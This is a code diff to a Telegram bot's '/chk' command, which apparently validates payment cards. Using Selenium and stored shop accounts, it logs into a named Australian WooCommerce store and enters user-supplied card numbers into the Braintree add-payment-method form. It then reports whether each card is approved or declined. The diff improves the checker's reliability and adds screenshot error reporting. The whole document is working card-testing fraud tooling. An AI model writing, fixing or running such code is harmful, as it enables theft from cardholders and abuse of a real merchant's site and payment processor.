@@ -6787,25 +6787,7 @@ async def bt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg = await update.message.reply_text(f"💳 `{card_str}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
         Process(target=run_bt_check, args=(card_str, update.effective_chat.id, msg.message_id), daemon=True).start()
 
-# ==== 10. /chk Command (Braintree Auth V2 - FINAL FIXED) ==== #
-
-def get_chk_accounts():
-    accounts = []
-    try:
-        with open("chk_accounts.txt", "r", encoding="utf-8") as f:
-            for line in f:
-                line = line.strip()
-                if ":" in line:
-                    email, password = line.split(":", 1)
-                elif "|" in line:
-                    email, password = line.split("|", 1)
-                else:
-                    continue
-                accounts.append((email.strip(), password.strip()))
-    except Exception as e:
-        print("Failed to read chk_accounts.txt:", e)
-    return accounts
-
+# ==== 10. /chk Command (FINAL - WITH SS + STABLE) ==== #
 
 def run_chk_process(card_input):
     import random, time, traceback
@@ -6819,16 +6801,17 @@ def run_chk_process(card_input):
     try:
         accounts = get_chk_accounts()
         if not accounts:
-            return {"error": "No accounts found"}
+            return {"error": "No accounts found", "driver": None}
 
         email, password = random.choice(accounts)
 
         driver = create_killer_driver()
-        wait = WebDriverWait(driver, 6)
+        wait = WebDriverWait(driver, 8)
 
-        driver.get("https://shop.pottyplant.com.au/my-account/add-payment-method/")
+        url = "https://shop.pottyplant.com.au/my-account/add-payment-method/"
+        driver.get(url)
 
-        # ================= LOGIN =================
+        # ===== LOGIN =====
         wait.until(EC.presence_of_element_located((By.ID, "username"))).send_keys(email)
         wait.until(EC.presence_of_element_located((By.ID, "password"))).send_keys(password)
 
@@ -6837,16 +6820,23 @@ def run_chk_process(card_input):
             wait.until(EC.presence_of_element_located((By.NAME, "login")))
         )
 
-        # ================= WAIT PAYMENT PAGE =================
-        wait.until(EC.presence_of_element_located((By.ID, "place_order")))
+        time.sleep(2)
+
+        # 🔥 FORCE REDIRECT
+        driver.get(url)
+
+        wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
+
+        # ===== WAIT BUTTON =====
+        add_btn = wait.until(EC.presence_of_element_located((By.ID, "place_order")))
 
         cc, mm, yy, cvv = killer_split_card(card_input)
 
-        # ================= BRAINTREE FILL (CORRECT) =================
-        try:
-            iframes = wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, "iframe")))
+        # ===== BRAINTREE FILL =====
+        iframes = driver.find_elements(By.CSS_SELECTOR, "iframe")
 
-            for iframe in iframes:
+        for iframe in iframes:
+            try:
                 driver.switch_to.frame(iframe)
                 src = iframe.get_attribute("src") or ""
 
@@ -6860,17 +6850,15 @@ def run_chk_process(card_input):
                     driver.find_element(By.NAME, "cvv").send_keys(cvv)
 
                 driver.switch_to.default_content()
+            except:
+                driver.switch_to.default_content()
 
-        except:
-            pass
-
-        # ================= SUBMIT =================
-        add_btn = wait.until(EC.presence_of_element_located((By.ID, "place_order")))
+        # ===== SUBMIT =====
         driver.execute_script("arguments[0].click();", add_btn)
 
         time.sleep(2)
 
-        # ================= RESPONSE =================
+        # ===== RESPONSE =====
         try:
             err = driver.find_element(By.CSS_SELECTOR, ".woocommerce-error li").text
             status = "DECLINED"
@@ -6890,9 +6878,11 @@ def run_chk_process(card_input):
             "account": email
         }
 
-    except Exception as e:
-        trace = traceback.format_exc()
-        return {"error": trace, "driver": driver}
+    except Exception:
+        return {
+            "error": traceback.format_exc(),
+            "driver": driver   # 🔥 IMPORTANT: pass driver for screenshot
+        }
 
     finally:
         try:
@@ -6940,7 +6930,7 @@ async def chk_cmd(update, context):
         result = await asyncio.to_thread(run_chk_process, card_input)
 
         if "error" in result:
-            raise Exception(result["error"])
+            raise Exception(result)
 
         await msg.edit_text(
             f"💳 `{card_input}`\n\n"
@@ -6956,12 +6946,14 @@ async def chk_cmd(update, context):
         record_cmd_success("chk")
 
     except Exception as e:
-        trace = str(e)
+        err_data = e.args[0] if isinstance(e.args[0], dict) else {}
+        trace = err_data.get("error", str(e))
+        driver = err_data.get("driver", None)
 
         await msg.edit_text("❌ Request timeout, try again.")
 
         try:
-            killer_admin_report("chk", trace, None)
+            killer_admin_report("chk", trace, driver)  # 📸 screenshot sent here
         except:
             pass
 
